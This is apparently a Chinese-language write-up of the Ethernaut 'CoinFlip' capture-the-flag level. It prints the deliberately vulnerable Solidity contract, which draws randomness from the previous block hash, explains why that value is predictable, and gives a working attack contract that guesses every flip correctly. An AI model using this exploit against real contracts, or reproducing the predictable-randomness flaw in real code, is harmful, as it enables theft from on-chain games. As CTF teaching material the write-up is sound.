#   Level 3 CoinFlip
實例地址：`0x7F6867D822AF8c2173C9829110126e9a5Dd8FD5d`

## 題目說明
這是一個擲銅板的遊戲。
你需要連續地猜對擲出來的結果。為了完成這一關，你需要利用你的超能力，然後連續猜對十次。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

##  POC
此合約使用 `block.number` 來產生隨機數，可以用攻擊合約先計算隨機數，再透過攻擊合約呼叫此合約，及可預測硬幣正反面。因為一筆外部交易 可能會觸發多個內部交易，而這些內部交易的 block.number 都會與原始交易相同。

觸發攻擊合約 `attack()` 十次可以達成。
### 攻擊合約
```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface CoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract Attack {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        CoinFlip(target).flip(side);
    }
}
```
